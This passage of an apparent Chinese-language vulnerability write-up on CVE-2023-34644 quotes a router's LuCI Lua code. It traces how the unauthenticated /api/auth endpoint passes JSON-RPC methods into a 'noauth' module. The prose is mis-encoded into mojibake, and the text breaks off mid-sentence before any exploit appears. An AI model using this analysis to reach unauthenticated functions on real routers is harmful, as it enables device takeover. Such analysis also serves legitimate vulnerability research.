    <content type="html"><![CDATA[<h1 id="CVE-2023-34644"><a href="#CVE-2023-34644" class="headerlink" title="CVE-2023-34644"></a>CVE-2023-34644</h1><h2 id="luciæ¡†æ¶å’Œluaæ–‡ä»¶"><a href="#luciæ¡†æ¶å’Œluaæ–‡ä»¶" class="headerlink" title="luciæ¡†æ¶å’Œluaæ–‡ä»¶"></a>luciæ¡†æ¶å’Œluaæ–‡ä»¶</h2><p><code>/etc/config/luci</code>é€šå¸¸æ˜¯luciæ¡†æ¶çš„é…ç½®æ–‡ä»¶ï¼Œ<code>/usr/lib/lua/luci</code> é€šå¸¸æ˜¯ LuCI æ¡†æ¶çš„æ ¸å¿ƒæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•</p><p>Lucié‡‡ç”¨çš„æ˜¯MVCçš„Webæ¡†æ¶ï¼Œå³<strong>Modelã€Viewã€Controller</strong>ã€‚</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/lua/luci/controller/   <span class="comment">--æ§åˆ¶å±‚ </span></span><br><span class="line">/usr/lib/lua/luci/view/ <span class="comment">--è§†å›¾å±‚</span></span><br><span class="line">/usr/lib/lua/luci/model/cbi/<span class="comment">--æ¨¡å‹å±‚</span></span><br></pre></td></tr></table></figure><p>æœªæˆæƒçš„æ¼æ´ï¼Œé‚£ä¹ˆé¦–å…ˆå°±è¦æ‰¾åˆ°æ— é‰´æƒçš„<code>API</code>æ¥å£ï¼Œå®šä½åˆ°<code>/usr/lib/lua/luci/controller/eweb/api.lua</code>æ–‡ä»¶ã€‚</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- APIé›†åˆ</span></span><br><span class="line"><span class="built_in">module</span>(<span class="string">&quot;luci.controller.eweb.api&quot;</span>, <span class="built_in">package</span>.<span class="built_in">seeall</span>)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">authenticator</span><span class="params">(validator)</span></span></span><br><span class="line">        <span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line">        <span class="keyword">local</span> sid = http.formvalue(<span class="string">&quot;auth&quot;</span>, <span class="literal">true</span>) <span class="keyword">or</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> sid <span class="keyword">then</span> <span class="comment">-- if authentication token was given</span></span><br><span class="line">            <span class="keyword">local</span> sauth = <span class="built_in">require</span> <span class="string">&quot;luci.sauth&quot;</span></span><br><span class="line">            sid = sid:<span class="built_in">match</span>(<span class="string">&quot;^[a-f0-9]*$&quot;</span>)</span><br><span class="line">            <span class="keyword">local</span> sdat = sauth.<span class="built_in">read</span>(sid)</span><br><span class="line">            <span class="keyword">if</span> sdat <span class="keyword">then</span> <span class="comment">-- if given token is valid</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(sdat) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span> <span class="comment">-- and sdat.rip == http.getenv(&quot;REMOTE_ADDR&quot;) then</span></span><br><span class="line">                    <span class="keyword">return</span> sdat</span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">        <span class="keyword">local</span> _ok, _auth = tool.doCheck()</span><br><span class="line">        <span class="keyword">if</span> _ok <span class="keyword">and</span> _auth <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">return</span> &#123;sid = _auth, token = _auth&#125;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="comment">-- æ‰§è¡Œä»£ç†è¯·æ±‚å¤±è´¥æ—¶ï¼Œä¸é€€å‡ºä¸»è®¾å¤‡çš„</span></span><br><span class="line">        <span class="comment">-- åœºæ™¯ï¼šåœ¨APåˆ—è¡¨ä»£ç†é…ç½®APå»é‡å¯è®¾å¤‡ï¼Œé‡å¯å®ŒæˆåAPçš„sessionæ²¡äº†ä½†æ˜¯ä¸è¦é€€å‡ºä¸»è®¾å¤‡çš„EWEB</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">string</span>.<span class="built_in">match</span>(http.<span class="built_in">getenv</span>(<span class="string">&#x27;HTTP_REFERER&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>, <span class="string">&quot;^.+/snos_red_%d+\.%d+\.%d+\.%d+/.+&quot;</span>) <span class="keyword">then</span></span><br><span class="line">            tool.logout()</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        http.<span class="built_in">status</span>(<span class="number">403</span>, <span class="string">&quot;Forbidden Api&quot;</span>)</span><br><span class="line">        http.write_json(&#123;code = <span class="number">2</span>, msg = <span class="string">&quot;403 Forbidden, auth is not passed&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> api = node(<span class="string">&quot;api&quot;</span>)</span><br><span class="line">    api.sysauth = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    api.sysauth_authenticator = authenticator</span><br><span class="line">    api.notemplate = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;auth&quot;</span>&#125;, call(<span class="string">&quot;rpc_auth&quot;</span>), <span class="literal">nil</span>).sysauth = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;common&quot;</span>&#125;, call(<span class="string">&quot;rpc_common&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;cmd&quot;</span>&#125;, call(<span class="string">&quot;rpc_cmd&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;system&quot;</span>&#125;, call(<span class="string">&quot;rpc_system&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;diagnose&quot;</span>&#125;, call(<span class="string">&quot;rpc_diagnose&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;overview&quot;</span>&#125;, call(<span class="string">&quot;rpc_overview&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;network&quot;</span>&#125;, call(<span class="string">&quot;rpc_network&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;wireless&quot;</span>&#125;, call(<span class="string">&quot;rpc_wireless&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;download&quot;</span>&#125;, call(<span class="string">&quot;down_file&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;switch&quot;</span>&#125;, call(<span class="string">&quot;rpc_switch&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;openvpn&quot;</span>&#125;, call(<span class="string">&quot;openvpn&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€äº›æ¨¡å—çš„å®šä¹‰ï¼Œä¸Šè¿°å¯ä»¥åˆ†ä¸º<strong>æ¨¡å—å£°æ˜</strong>å’Œ<strong>è·¯ç”±å®šä¹‰</strong>ï¼Œå…¶ä¸­æ¨¡å—å£°æ˜ä¸­</p><ul><li><code>module(&quot;luci.controller.eweb.api&quot;, package.seeall)</code>ï¼šå®šä¹‰ä¸€ä¸ªåä¸º <code>luci.controller.eweb.api</code> çš„æ¨¡å—ï¼Œå¹¶å¯¼å‡ºæ‰€æœ‰å‡½æ•°ã€‚</li></ul><p>è·¯ç”±å®šä¹‰ä¸­</p><ul><li><code>entry(&#123;&quot;api&quot;, &quot;auth&quot;&#125;, call(&quot;rpc_auth&quot;), nil).sysauth = false</code>ï¼šæ³¨å†Œ <code>/api/auth</code> è·¯å¾„ï¼Œè°ƒç”¨ <code>rpc_auth</code> å‡½æ•°å¤„ç†è¯·æ±‚ï¼Œå¹¶ç¦ç”¨ç³»ç»Ÿè®¤è¯ã€‚</li></ul><p>æ ¹æ®å…¶ä¸­è°ƒç”¨çš„rpc_authå‡½æ•°</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- è®¤è¯æ¨¡å—</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rpc_auth</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> jsonrpc = <span class="built_in">require</span> <span class="string">&quot;luci.utils.jsonrpc&quot;</span></span><br><span class="line">    <span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line">    <span class="keyword">local</span> ltn12 = <span class="built_in">require</span> <span class="string">&quot;luci.ltn12&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _tbl = <span class="built_in">require</span> <span class="string">&quot;luci.modules.noauth&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">tonumber</span>(http.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_CONTENT_LENGTH&quot;</span>) <span class="keyword">or</span> <span class="number">0</span>) &gt; <span class="number">1000</span> <span class="keyword">then</span></span><br><span class="line">        http.prepare_content(<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">        <span class="comment">-- http.write(&#123;code = &quot;1&quot;, err = &quot;too long data&quot;&#125;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;too long data&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    http.prepare_content(<span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">    ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.<span class="built_in">write</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¼•å…¥äº†å¿…è¦çš„æ¨¡å—</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> jsonrpc = <span class="built_in">require</span> <span class="string">&quot;luci.utils.jsonrpc&quot;</span></span><br><span class="line"><span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line"><span class="keyword">local</span> ltn12 = <span class="built_in">require</span> <span class="string">&quot;luci.ltn12&quot;</span></span><br><span class="line"><span class="keyword">local</span> _tbl = <span class="built_in">require</span> <span class="string">&quot;luci.modules.noauth&quot;</span></span><br></pre></td></tr></table></figure><ul><li><code>jsonrpc</code>ï¼šç”¨äºå¤„ç† JSON-RPC è¯·æ±‚ã€‚</li><li><code>http</code>ï¼šç”¨äºå¤„ç† HTTP è¯·æ±‚å’Œå“åº”ã€‚</li><li><code>ltn12</code>ï¼šç”¨äºå¤„ç†æ•°æ®æµã€‚</li><li><code>_tbl</code>ï¼šå‡è®¾æ˜¯ä¸€ä¸ªåŒ…å«æ— è®¤è¯åŠŸèƒ½çš„æ¨¡å—ï¼ˆ<code>noauth</code>ï¼‰ï¼Œç”¨äºå¤„ç†å®é™…çš„ JSON-RPC æ–¹æ³•ã€‚</li></ul><p>å› æ­¤å®šä½åˆ°å¯¹åº”çš„å¤„ç†æ–‡ä»¶&#x2F;usr&#x2F;lib&#x2F;lua&#x2F;luci&#x2F;modules&#x2F;noauth.lua</p><p>ç„¶åå†çœ‹luci.utils.jsonrpc</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--[[</span></span><br><span class="line"><span class="comment">LuCI - Lua Configuration Interface</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Copyright 2008 Steven Barth &lt;steven@midlink.org&gt;</span></span><br><span class="line"><span class="comment">Copyright 2008 Jo-Philipp Wich &lt;xm@leipzig.freifunk.net&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment">you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment">You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$Id$</span></span><br><span class="line"><span class="comment">]]</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>(<span class="string">&quot;luci.utils.jsonrpc&quot;</span>, <span class="built_in">package</span>.<span class="built_in">seeall</span>)</span><br><span class="line"><span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resolve</span><span class="params">(mod, method)</span></span></span><br><span class="line">    <span class="keyword">local</span> <span class="built_in">path</span> = luci.util.split(method, <span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j = <span class="number">1</span>, #<span class="built_in">path</span> - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="built_in">mod</span> = <span class="built_in">rawget</span>(<span class="built_in">mod</span>, <span class="built_in">path</span>[j])</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">mod</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">mod</span> = <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;table&quot;</span> <span class="keyword">and</span> <span class="built_in">rawget</span>(<span class="built_in">mod</span>, <span class="built_in">path</span>[#<span class="built_in">path</span>]) <span class="keyword">or</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;function&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">mod</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(tbl, rawsource, ...)</span></span></span><br><span class="line">    <span class="keyword">local</span> decoder = luci.json.Decoder()</span><br><span class="line">    <span class="keyword">local</span> stat, err = luci.ltn12.pump.all(rawsource, decoder:sink())</span><br><span class="line">    <span class="keyword">local</span> json = decoder:get()</span><br><span class="line">    <span class="keyword">local</span> response</span><br><span class="line">    <span class="keyword">local</span> success = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> stat <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(json.method) == <span class="string">&quot;string&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> method = resolve(tbl, json.method)</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">then</span></span><br><span class="line">                response = reply(json.jsonrpc, json.id, proxy(method, json.params <span class="keyword">or</span> &#123;&#125;))</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                response = reply(json.jsonrpc, json.id, <span class="literal">nil</span>, &#123;code = <span class="number">-32601</span>, message = <span class="string">&quot;Method not found.&quot;</span>&#125;)</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            response = reply(json.jsonrpc, json.id, <span class="literal">nil</span>, &#123;code = <span class="number">-32600</span>, message = <span class="string">&quot;Invalid request.&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        response = reply(<span class="string">&quot;2.0&quot;</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, &#123;code = <span class="number">-32700</span>, message = <span class="string">&quot;Parse error.&quot;</span>, err = err&#125;)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> luci.json.Encoder(response, ...):source()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reply</span><span class="params">(jsonrpc, id, res, err)</span></span></span><br><span class="line">    <span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line">    id = id <span class="keyword">or</span> luci.json.null</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- 1.0 compatibility</span></span><br><span class="line">    <span class="keyword">if</span> jsonrpc ~= <span class="string">&quot;2.0&quot;</span> <span class="keyword">then</span></span><br><span class="line">        jsonrpc = <span class="literal">nil</span></span><br><span class="line">        res = res <span class="keyword">or</span> luci.json.null</span><br><span class="line">        err = err <span class="keyword">or</span> luci.json.null</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="comment">-- if type(res) == &quot;string&quot; then</span></span><br><span class="line">    <span class="comment">--     res = luci.json.decode(res) or res</span></span><br><span class="line">    <span class="comment">-- end</span></span><br><span class="line">    <span class="keyword">return</span> &#123;id = id, data = res, <span class="built_in">error</span> = err, jsonrpc = jsonrpc, code = <span class="number">0</span>&#125;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">proxy</span><span class="params">(method, ...)</span></span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">local</span> res = &#123;luci.util.copcall(method, ...)&#125;</span><br><span class="line">    <span class="keyword">local</span> stat = <span class="built_in">table</span>.<span class="built_in">remove</span>(res, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> stat <span class="keyword">then</span></span><br><span class="line">        tool.<span class="built_in">debug</span>(<span class="string">&quot;[&quot;</span> .. <span class="built_in">os</span>.<span class="built_in">date</span>() .. <span class="string">&quot; -s]&quot;</span> .. <span class="string">&quot;=====      RPC ERROR LOG&quot;</span>, &#123;params = ...&#125;)</span><br><span class="line">        <span class="comment">-- return nil, &#123;code = -32602, data = &quot;jsonrpc:81&quot;, params = ..., res = res&#125;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, &#123;code = <span class="number">-32602</span>, data = <span class="string">&quot;jsonrpc:81&quot;</span>, res = res&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> #res &lt;= <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">return</span> res[<span class="number">1</span>] <span class="keyword">or</span> luci.json.null</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            tool.<span class="built_in">debug</span>(<span class="string">&quot;[&quot;</span> .. <span class="built_in">os</span>.<span class="built_in">date</span>() .. <span class="string">&quot; -s]&quot;</span> .. <span class="string">&quot;=====      RPC ERROR LOG&quot;</span>, &#123;params = ...&#125;)</span><br><span class="line">            <span class="comment">-- return &#123;code = -32603, data = &quot;jsonrpc:89&quot;, params = ..., res = res&#125;</span></span><br><span class="line">            <span class="keyword">return</span> &#123;code = <span class="number">-32603</span>, data = <span class="string">&quot;jsonrpc:89&quot;</span>, res = res&#125;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å››ä¸ªå‡½æ•°åˆ†åˆ«çš„ä½œç”¨æ˜¯</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resolve(<span class="built_in">mod</span>, method)ï¼š <span class="comment">---è§£ææ¨¡å— mod ä¸­çš„æ–¹æ³• methodã€‚</span></span><br><span class="line">handle(tbl, rawsource, ...)ï¼š <span class="comment">---å¤„ç† JSON-RPC è¯·æ±‚ã€‚</span></span><br><span class="line">reply(jsonrpc, id, res, err)ï¼š <span class="comment">---ç”Ÿæˆ JSON-RPC å“åº”ã€‚</span></span><br><span class="line">proxy(method, ...)ï¼š <span class="comment">---ä»£ç†æ‰§è¡Œ JSON-RPC æ–¹æ³•ã€‚</span></span><br></pre></td></tr></table></figure><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(tbl, rawsource, ...)</span></span></span><br><span class="line">    <span class="keyword">local</span> decoder = luci.json.Decoder()</span><br><span class="line">    <span class="keyword">local</span> stat, err = luci.ltn12.pump.all(rawsource, decoder:sink())</span><br><span class="line">    <span class="keyword">local</span> json = decoder:get()</span><br><span class="line">    <span class="keyword">local</span> response</span><br><span class="line">    <span class="keyword">local</span> success = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> stat <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(json.method) == <span class="string">&quot;string&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> method = resolve(tbl, json.method)</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">then</span></span><br><span class="line">                response = reply(json.jsonrpc, json.id, proxy(method, json.params <span class="keyword">or</span> &#123;&#125;))</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                response = reply(json.jsonrpc, json.id, <span class="literal">nil</span>, &#123;code = <span class="number">-32601</span>, message = <span class="string">&quot;Method not found.&quot;</span>&#125;)</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            response = reply(json.jsonrpc, json.id, <span class="literal">nil</span>, &#123;code = <span class="number">-32600</span>, message = <span class="string">&quot;Invalid request.&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        response = reply(<span class="string">&quot;2.0&quot;</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, &#123;code = <span class="number">-32700</span>, message = <span class="string">&quot;Parse error.&quot;</span>, err = err&#125;)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> luci.json.Encoder(response, ...):source()</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>ç€é‡çœ‹ä¸­é—´éƒ¨åˆ†ï¼š</p><ul><li>ä½¿ç”¨ <code>resolve</code> å‡½æ•°è§£æmethodï¼Œæ‰¾åˆ°å¯¹åº”çš„ Lua å‡½æ•°ã€‚</li><li>å¦‚æœæ‰¾åˆ°æ–¹æ³•ï¼Œä½¿ç”¨<code>proxy</code>å‡½æ•°è°ƒç”¨æ–¹æ³•ï¼Œå¹¶ç”Ÿæˆå“åº”ã€‚<ul><li><code>proxy(method, json.params or &#123;&#125;)</code>ï¼šè°ƒç”¨æ–¹æ³•å¹¶ä¼ é€’å‚æ•°ã€‚</li><li><code>reply(json.jsonrpc, json.id, ...)</code>ï¼šç”Ÿæˆ JSON-RPC å“åº”ã€‚</li></ul></li><li>å¦‚æœæœªæ‰¾åˆ°æ–¹æ³•ï¼Œç”Ÿæˆé”™è¯¯å“åº”ï¼Œé”™è¯¯ç  <code>-32601</code> è¡¨ç¤º â€œMethod not foundâ€ã€‚</li></ul><p>ä»£ç ç»†èŠ‚ï¼š</p><ul><li><p><code>resolve</code> å‡½æ•°ç”¨äºè§£ææ–¹æ³•åï¼Œæ‰¾åˆ°å¯¹åº”çš„ Lua å‡½æ•°ã€‚</p></li><li><p>å®ƒå°†æ–¹æ³•åæŒ‰ <code>.</code> åˆ†å‰²æˆè·¯å¾„ï¼Œç„¶åé€çº§æŸ¥æ‰¾å¯¹åº”çš„è¡¨ï¼Œæœ€ç»ˆæ‰¾åˆ°æ–¹æ³•ã€‚</p></li><li><p><code>reply</code> å‡½æ•°ç”¨äºç”Ÿæˆ JSON-RPC å“åº”ã€‚</p></li><li><p>å®ƒæ ¹æ® JSON-RPC ç‰ˆæœ¬å’Œè¯·æ±‚ ID ç”Ÿæˆå“åº”å¯¹è±¡ã€‚</p></li><li><p><code>proxy</code> 